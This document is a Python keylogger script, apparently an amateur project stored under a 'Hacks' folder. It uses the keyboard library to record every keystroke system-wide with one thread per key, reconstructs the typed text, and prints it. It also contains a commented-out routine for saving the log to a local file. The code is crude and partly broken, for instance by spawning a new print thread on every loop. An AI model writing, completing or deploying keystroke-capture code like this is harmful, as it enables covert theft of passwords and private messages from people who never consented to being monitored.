import keyboard
import threading

def Print():
    prev_size=100
    while True:
        print(f"{keys.strip()}{' '*prev_size}", end='\r')
        prev_size=len(keys)

def Save():
    while True:
        with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\KeyboardRecorder\keylogs.txt","w") as keylogs:
            keylogs.write(keys)
            keylogs.close()

def LetterRecorder(letter):
    while True:
        recorded=str(keyboard.record(until=letter))
        AllLetters.append(recorded)

def Record(letter):
    letter=threading.Thread(target=LetterRecorder, args=(letter,))
    letter.start()

AllLetters=["None","None"]

#F
Record("f1")
Record("f2")
Record("f3")
Record("f4")
Record("f5")
Record("f6")
Record("f7")
Record("f8")
Record("f9")
Record("f10")
Record("f11")
Record("f12")

#Commands
Record("print screen")
Record("scroll lock")
Record("pause")
Record("backspace")
Record("caps lock")
Record("enter")
Record("right shift")
Record("delete")
Record("home")
Record("num lock")
Record("insert")
Record("end")
Record("tab")
Record("page up")
Record("page down")
Record("ctrl")
Record("alt")
Record("space")
Record("right alt")
Record("menu")
Record("right ctrl")
Record("left")
Record("down")
Record("right")
Record("up")
Record("left windows")
Record("esc")

#Symbols
Record("`")
Record("~")
Record("-")
Record("=")
Record("!")
Record("@")
Record("#")
Record("$")
Record("%")
Record("&")
Record("(")
Record(")")
Record("_")
Record("+")
Record("[")
Record("]")
Record("{")
Record("}")
Record("|")
Record(";")
Record("'")
Record(":")
Record('"')
Record(",")
Record(".")
Record("/")
Record("<")
Record(">")
Record("?")
Record("*")
Record("^")

#Numbers
Record("1")
Record("2")
Record("3")
Record("4")
Record("5")
Record("6")
Record("7")
Record("8")
Record("9")
Record("0")

#Letters
Record("a")
Record("b")
Record("c")
Record("d")
Record("e")
Record("f")
Record("g")
Record("h")
Record("i")
Record("j")
Record("k")
Record("l")
Record("m")
Record("n")
Record("o")
Record("p")
Record("q")
Record("r")
Record("s")
Record("t")
Record("u")
Record("v")
Record("w")
Record("x")
Record("y")
Record("z")

keys=""
Allkeys=[]

#Save1=threading.Thread(target=Save)
#Save1.start()

while True:
    recorded=str(AllLetters)+"\n"

    rawkeys=""
    Start=0
    End=0
    AllButtons=["$NONE$"]
    while recorded[Start]!="\n":
        if recorded[Start-1]=="(":
            End=0
            Button=""
            while recorded[Start+End:Start+End+6]!=" down)" and recorded[Start+End:Start+End+4]!=" up)":
                Button+=recorded[Start+End]
                End+=1
            if Button=="space":
                rawkeys+=" "
            elif recorded[Start+End+1]=="d":
                AllButtons.append(Button)
                if (Button=="shift" and AllButtons[-1]=="shift"):
                    pass
                else:
                    if Button=="backspace":
                        rawkeys=rawkeys[:-1]
                    else:
                        rawkeys+=Button
        Start+=1

    listkeys=list(rawkeys)
    keys=("".join(listkeys))
    Allkeys.append(keys)


    Print1=threading.Thread(target=Print)
    Print1.start()
